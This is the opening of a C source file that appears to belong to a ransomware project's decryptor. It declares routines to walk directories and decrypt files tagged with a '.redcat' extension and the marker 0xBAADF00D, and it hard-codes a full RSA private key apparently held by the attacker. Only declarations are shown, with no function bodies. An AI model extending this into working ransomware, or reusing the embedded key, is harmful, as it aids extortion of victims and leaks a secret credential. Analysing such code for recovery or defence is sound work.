#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/stat.h>
#include <openssl/aes.h>
#include <openssl/evp.h>

/* if this is defined, then the vector will double in capacity each
 * time it runs out of space. if it is not defined, then the vector will
 * be conservative, and will have a capcity no larger than necessary.
 * having this defined will minimize how often realloc gets called.
 */
#define CVECTOR_LOGARITHMIC_GROWTH
#include "cvector.h"

#define AES_128_ECB 0
#define AES_192_ECB 1
#define AES_256_ECB 2
#define AES_128_CBC 3
#define AES_192_CBC 4
#define AES_256_CBC 5
#define AES_IV_LENGTH 16
#define MAX_PATH_LENGTH 256
#define CIPHER_MODE_LENGTH 8
#define CIPHER_NAME_LENGTH 12

#define ATK_RSA_SECRET_KEY "-----BEGIN RSA PRIVATE KEY-----\n" \
    "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\n" \
    "-----END RSA PRIVATE KEY-----"
#define INFECTED_FILE_EXT ".redcat"
#define INFECTED_FILE_SIG 0xBAADF00D

typedef struct
{
    cvector_vector_type(char*) paths;
} thread_args;

typedef struct
{
    unsigned char* iv;
    unsigned char* key;
    int mode;
    int signature;
} footer;

void print_usage();
int is_infected_file(char* path);
int is_valid_options(char* target);
int decrypt_file(char* original_path);
int worker_decryption_proc(thread_args* args);
int do_decrypt(cvector_vector_type(char*)* paths);
int parse_options(char* target, int argc, char** argv);
char* number_to_ciphername(char* ciphername, int mode);
void walkdir(cvector_vector_type(char*)* paths, char* parent_dir);